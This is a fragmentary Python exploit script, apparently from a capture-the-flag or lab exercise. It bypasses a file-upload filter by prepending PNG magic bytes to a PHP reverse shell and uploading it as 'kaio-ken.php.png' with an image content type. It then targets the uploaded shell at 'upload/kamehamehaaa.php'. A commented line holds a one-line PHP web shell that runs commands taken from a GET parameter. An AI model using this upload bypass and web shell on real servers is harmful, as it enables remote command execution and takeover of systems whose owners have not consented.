...
def shell():
    with open("php-reverse-shell.php",'r') as input_file:
       content = input_file.read()
    return content

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehamehaaa.php'
...
if __name__ == "__main__":
    ...
    UPLOAD_DIR = 'upload.php?id=kamehamehaaa'
    ...
    png     = {
                'file': 
                  (
                    'kaio-ken.php.png', 
                    PNG_magicBytes+'\n'+ shell(), #'<?php echo shell_exec($_GET["telepathy"]); ?>', 
                    'image/png', 
